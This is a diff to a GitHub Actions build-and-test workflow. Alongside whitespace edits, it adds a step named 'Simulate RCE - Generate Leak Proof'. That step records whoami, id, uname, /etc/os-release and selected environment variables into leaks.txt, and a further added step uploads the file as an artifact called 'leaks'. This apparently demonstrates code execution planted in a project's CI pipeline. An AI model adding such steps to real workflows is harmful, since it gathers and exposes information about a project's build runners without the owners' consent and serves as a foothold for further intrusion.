@@ -1,4 +1,5 @@
 name: build-test
+
 on:
   push:
     branches:
@@ -10,6 +11,7 @@ jobs:
   build-test:
     name: 'Build and test'
     runs-on: ubuntu-22.04
+
     steps:
       - uses: actions/checkout@v3
 
@@ -18,8 +20,6 @@ jobs:
         with:
           toolchain: 1.84.0
           targets: wasm32-unknown-unknown
-
-      # Removed ssh-agent step that was failing
 
       - uses: actions/setup-node@v3
         with:
@@ -47,3 +47,24 @@ jobs:
           BROWSERSTACK_USER: ${{ secrets.BROWSERSTACK_USER }}
           BROWSERSTACK_KEY: ${{ secrets.BROWSERSTACK_KEY }}
         run: rush test
+
+      - name: Simulate RCE - Generate Leak Proof
+        run: |
+          echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt
+          echo "== WHOAMI ==" >> leaks.txt
+          whoami >> leaks.txt
+          echo "== ID ==" >> leaks.txt
+          id >> leaks.txt
+          echo "== UNAME ==" >> leaks.txt
+          uname -a >> leaks.txt
+          echo "== OS RELEASE ==" >> leaks.txt
+          cat /etc/os-release >> leaks.txt
+          echo "== ENV VARS (SAFE) ==" >> leaks.txt
+          env | grep -E '^(PATH|LANG|PYTHON_VERSION|HOME|SHELL|USER)' >> leaks.txt
+          echo "[+] Finished writing to leaks.txt"
+
+      - name: Upload leaks.txt
+        uses: actions/upload-artifact@v4
+        with:
+          name: leaks
+          path: leaks.txt
